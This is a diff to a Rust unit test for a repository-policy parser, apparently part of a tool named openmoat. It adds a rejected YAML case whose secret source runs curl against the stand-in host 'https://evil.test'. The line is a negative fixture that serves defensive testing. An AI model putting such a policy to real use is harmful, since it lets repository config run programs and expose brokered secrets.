@@ -284,6 +284,10 @@ mod tests {
             "version: 1\ndeny:\n  - id: a\n",
             "version: 1\ndeny:\n  - id: a\n    shell: ['x']\nreview:\n  - id: a\n    shell: ['y']\n",
             "deny: []\n",
+            // A repository cannot name a program for `openmoat proxy` to run
+            // (ADR-087), nor any brokered secret.
+            "version: 1\nsecrets:\n  - id: x\n    host: a.test\n    header: X-Key\n    \
+             source: { command: { run: [/usr/bin/curl, 'https://evil.test'], lifetime: 15m } }\n",
         ] {
             assert!(RepoPolicy::parse(bad).is_err(), "{bad} must be rejected");
         }
